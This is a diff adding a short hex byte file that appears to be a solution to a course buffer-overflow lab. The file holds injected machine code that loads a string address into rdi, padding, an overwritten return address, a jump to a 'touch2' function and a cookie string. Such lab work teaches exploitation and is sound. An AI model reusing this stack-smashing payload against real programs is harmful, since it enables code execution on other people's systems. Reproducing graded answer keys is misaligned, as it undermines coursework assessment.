@@ -1,0 +1,11 @@
+48 c7 c7 20 8f 65 55 c3 /* Moves the string value of the hext, line 10, to rdi (48 c7 c7) and returns (c3) */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d8 8e 65 55 00 00 00 00 /* RUNS FIRST: will call the address of the first line */
+b5 13 40 00 00 00 00 00 /* Calls touch2 */
+31 36 65 32 31 33 31 34 
+00
